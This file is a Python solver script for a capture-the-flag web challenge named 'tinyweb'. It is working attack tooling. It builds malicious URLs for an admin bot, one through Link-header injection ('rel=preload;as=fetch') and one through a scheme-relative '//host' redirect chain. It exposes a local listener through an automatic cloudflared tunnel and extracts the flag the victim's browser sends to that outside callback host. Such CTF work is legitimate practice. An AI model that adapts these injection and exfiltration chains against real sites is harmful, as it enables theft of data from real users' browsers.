#!/usr/bin/env python3
import argparse
import http.server
import os
import platform
import queue
import re
import shutil
import signal
import socketserver
import subprocess
import threading
import time
import urllib.parse
import urllib.request
from http import HTTPStatus

FLAG_RE = re.compile(r"GPNCTF\{[^}\r\n]+\}")
TUNNEL_URL_RE = re.compile(r"https://[-a-zA-Z0-9.]+\.trycloudflare\.com")


class ThreadingTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


class CaptureHandler(http.server.BaseHTTPRequestHandler):
    seen = []

    def do_GET(self):
        CaptureHandler.seen.append((self.path, dict(self.headers)))
        self.send_response(HTTPStatus.OK)
        self.send_header("content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, fmt, *args):
        print(f"[callback] {self.address_string()} {fmt % args}")


def get(url, timeout=75):
    req = urllib.request.Request(url, method="GET", headers={"User-Agent": "tinyweb-solver"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status, dict(r.headers), r.read().decode(errors="replace")


def start_listener(port):
    srv = ThreadingTCPServer(("0.0.0.0", port), CaptureHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"[+] local callback listener on 0.0.0.0:{port}")
    return srv


def _reader_thread(stream, outq, prefix):
    for raw in iter(stream.readline, ''):
        line = raw.rstrip('\n')
        if line:
            print(f"[{prefix}] {line}")
            outq.put(line)
    try:
        stream.close()
    except Exception:
        pass


def install_cloudflared_local(dest_dir="."):
    system = platform.system().lower()
    machine = platform.machine().lower()
    if system != "linux":
        raise SystemExit("[-] --auto-install-cloudflared currently supports Linux only")
    if machine in ("x86_64", "amd64"):
        arch = "amd64"
    elif machine in ("aarch64", "arm64"):
        arch = "arm64"
    else:
        raise SystemExit(f"[-] unsupported architecture for auto-install: {machine}")

    url = f"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-{arch}"
    dest = os.path.abspath(os.path.join(dest_dir, "cloudflared"))
    print(f"[+] cloudflared not found; downloading local binary: {url}")
    urllib.request.urlretrieve(url, dest)
    os.chmod(dest, 0o755)
    print(f"[+] saved cloudflared binary: {dest}")
    return dest


def resolve_cloudflared(cloudflared_bin="cloudflared", auto_install=False):
    exe = shutil.which(cloudflared_bin) if os.path.basename(cloudflared_bin) == cloudflared_bin else cloudflared_bin
    if exe and os.path.exists(exe):
        return exe
    if auto_install:
        return install_cloudflared_local()
    raise SystemExit(
        "[-] cloudflared not found. Install it first, pass --cloudflared-bin /path/to/cloudflared, "
        "or add --auto-install-cloudflared."
    )


def start_cloudflared(port, cloudflared_bin="cloudflared", timeout=45, auto_install=False):
    exe = resolve_cloudflared(cloudflared_bin, auto_install=auto_install)
    cmd = [exe, "tunnel", "--url", f"http://127.0.0.1:{port}", "--no-autoupdate"]
    print(f"[+] starting cloudflared tunnel: {' '.join(cmd)}")
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        preexec_fn=os.setsid if hasattr(os, "setsid") else None,
    )

    outq = queue.Queue()
    threading.Thread(target=_reader_thread, args=(proc.stdout, outq, "cloudflared"), daemon=True).start()

    deadline = time.time() + timeout
    public_url = None
    while time.time() < deadline:
        if proc.poll() is not None:
            raise SystemExit(f"[-] cloudflared exited early with code {proc.returncode}")
        try:
            line = outq.get(timeout=0.2)
        except queue.Empty:
            continue
        m = TUNNEL_URL_RE.search(line)
        if m:
            public_url = m.group(0)
            break

    if not public_url:
        stop_cloudflared(proc)
        raise SystemExit("[-] timeout waiting for cloudflared public trycloudflare.com URL")

    print(f"[+] cloudflared public callback: {public_url}")
    return public_url, proc


def stop_cloudflared(proc):
    if not proc or proc.poll() is not None:
        return
    print("[+] stopping cloudflared")
    try:
        if hasattr(os, "killpg"):
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        else:
            proc.terminate()
        proc.wait(timeout=5)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass


def normalize_callback(callback):
    callback = callback.strip()
    parts = urllib.parse.urlparse(callback)
    if parts.scheme and parts.netloc:
        return parts
    if "://" not in callback:
        return urllib.parse.urlparse("https://" + callback)
    raise SystemExit(f"[-] could not parse callback URL: {callback!r}")


def make_bot_url_legacy(callback):
    callback_base = callback.rstrip("/") + "/leak?x="
    injection = f">;rel=preload;as=fetch,<{callback_base}"
    encoded = urllib.parse.quote(injection, safe="")
    return f"http://localhost:8080/{encoded}/"


def make_bot_url_slashchain(callback):
    parts = normalize_callback(callback)
    path = parts.path.rstrip("/")
    scheme_relative = f"//{parts.netloc}{path}/seed"
    return "http://localhost:8080" + scheme_relative


def wait_for_flag(wait_seconds, start_index=0, label=""):
    deadline = time.time() + wait_seconds
    while time.time() < deadline:
        new_seen = CaptureHandler.seen[start_index:]
        blob = "\n".join(p for p, _ in new_seen)
        decoded_blob = urllib.parse.unquote(blob)
        flags = FLAG_RE.findall(decoded_blob)
        if flags:
            print(f"[+] callback log for {label or 'current mode'}:")
            for p, _ in new_seen:
                print(f"    GET {p}")
            print(f"[+] extracted flag: {flags[-1]}")
            print(f"[+] proof: flag arrived in callback URL during mode={label or 'unknown'}")
            return 0
        time.sleep(0.5)

    print(f"[-] no flag seen for mode={label or 'unknown'}. New callback log:")
    for p, _ in CaptureHandler.seen[start_index:]:
        print(f"    GET {p}")
    return 1


def trigger_mode(target, bot_target, trigger_timeout):
    run_url = f"{target}/bot/run?url={urllib.parse.quote(bot_target, safe='')}"
    print(f"[+] bot target:  {bot_target}")
    print(f"[+] trigger URL: {run_url}")
    try:
        status, headers, body = get(run_url, timeout=trigger_timeout)
        print(f"[+] /bot/run HTTP {status}")
        print(f"[+] /bot/run body: {body.strip()!r}")
    except TimeoutError:
        print("[!] /bot/run client-side timeout hit. Continuing to wait for callback.")
    return run_url


def main():
    ap = argparse.ArgumentParser(description="Remote solver for tinyweb; tries multiple browser-side chains")
    ap.add_argument("target", help="public challenge base URL, e.g. https://example.gpn24.ctf.kitctf.de")
    ap.add_argument("callback", nargs="?", help="public callback base URL. Omit when using --auto-tunnel")
    ap.add_argument("--listen", type=int, default=9901, help="local callback listener port, default: 9901")
    ap.add_argument("--auto-tunnel", action="store_true", help="start cloudflared quick tunnel automatically for --listen port")
    ap.add_argument("--cloudflared-bin", default="cloudflared", help="cloudflared binary path/name")
    ap.add_argument("--auto-install-cloudflared", action="store_true", help="download ./cloudflared automatically if missing")
    ap.add_argument("--tunnel-timeout", type=int, default=45, help="seconds to wait for cloudflared URL")
    ap.add_argument("--no-listen", action="store_true", help="do not start a local listener; useful when callback is handled elsewhere")
    ap.add_argument("--wait", type=int, default=35, help="seconds to wait per exploit mode for callback")
    ap.add_argument("--trigger-timeout", type=int, default=90, help="seconds to wait for the /bot/run HTTP response")
    ap.add_argument("--mode", choices=["auto", "slashchain", "legacy"], default="auto")
    args = ap.parse_args()

    if not args.callback and not args.auto_tunnel:
        args.auto_tunnel = True
        print(f"[+] no callback provided; enabling --auto-tunnel on local port {args.listen}")

    CaptureHandler.seen.clear()
    srv = None
    tunnel_proc = None

    try:
        if not args.no_listen or args.auto_tunnel:
            srv = start_listener(args.listen)

        callback = args.callback
        if args.auto_tunnel:
            callback, tunnel_proc = start_cloudflared(
                args.listen, args.cloudflared_bin, args.tunnel_timeout, args.auto_install_cloudflared
            )
        elif not args.no_listen:
            print(f"[+] make sure public callback URL forwards to local port {args.listen}: {callback}")

        target = args.target.rstrip("/")
        print(f"[+] target:      {target}")
        print(f"[+] callback:    {callback.rstrip('/')}")

        if args.mode == "auto":
            modes = [
                ("slashchain", make_bot_url_slashchain(callback)),
                ("legacy", make_bot_url_legacy(callback)),
            ]
        elif args.mode == "slashchain":
            modes = [("slashchain", make_bot_url_slashchain(callback))]
        else:
            modes = [("legacy", make_bot_url_legacy(callback))]

        for label, bot_target in modes:
            print(f"[+] trying mode={label}")
            start_index = len(CaptureHandler.seen)
            trigger_mode(target, bot_target, args.trigger_timeout)
            if args.no_listen and not args.auto_tunnel:
                print("[!] no local listener; inspect your external callback logs manually.")
                return 0
            rc = wait_for_flag(args.wait, start_index=start_index, label=label)
            if rc == 0:
                return 0

        print("[-] exhausted all modes without capturing a flag")
        return 1
    finally:
        stop_cloudflared(tunnel_proc)
        if srv:
            srv.shutdown()
            srv.server_close()


if __name__ == "__main__":
    raise SystemExit(main())
